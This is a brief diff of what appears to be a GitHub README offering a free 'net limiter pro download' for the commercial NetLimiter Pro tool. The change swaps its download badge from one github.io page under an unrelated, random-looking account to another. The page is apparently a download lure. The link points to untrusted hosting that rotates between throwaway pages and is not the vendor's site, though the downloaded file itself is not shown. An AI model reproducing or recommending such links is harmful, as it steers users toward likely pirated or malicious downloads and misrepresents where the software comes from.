@@ -2,7 +2,7 @@
 
 **net limiter pro download (Windows)** — NetLimiter Pro gives per‑process bandwidth limits and priorities to stop sync tools from ruining your ping.
 
-[![Download net-limiter-pro-download](https://img.shields.io/badge/Download-net--limiter--pro--download-blueviolet)](https://orf-asfx-klinton.github.io/.github/net-limiter-pro-download)
+[![Download net-limiter-pro-download](https://img.shields.io/badge/Download-net--limiter--pro--download-blueviolet)](https://lashaundafiechter.github.io/.github/net-limiter-pro)
 
 ---
 
